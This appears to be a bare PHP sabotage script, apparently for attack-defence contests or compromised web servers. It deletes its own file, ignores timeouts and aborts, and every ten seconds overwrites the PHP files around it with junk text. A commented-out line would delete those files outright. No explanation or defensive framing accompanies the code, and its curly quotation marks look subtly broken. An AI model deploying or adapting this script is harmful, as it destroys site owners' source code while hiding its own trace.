<?php

    set_time_limit(0);

    ignore_user_abort(1);

    unlink(__FILE__);

    function getfiles($path){

        foreach(glob($path) as $afile){

            if(is_dir($afile))

                getfiles($afile.'/*.php');

            else

                @file_put_contents($afile,”#Anything#”);

                //unlink($afile);

        }

    }

    while(1){

        getfiles(__DIR__);

        sleep(10);

    }

?>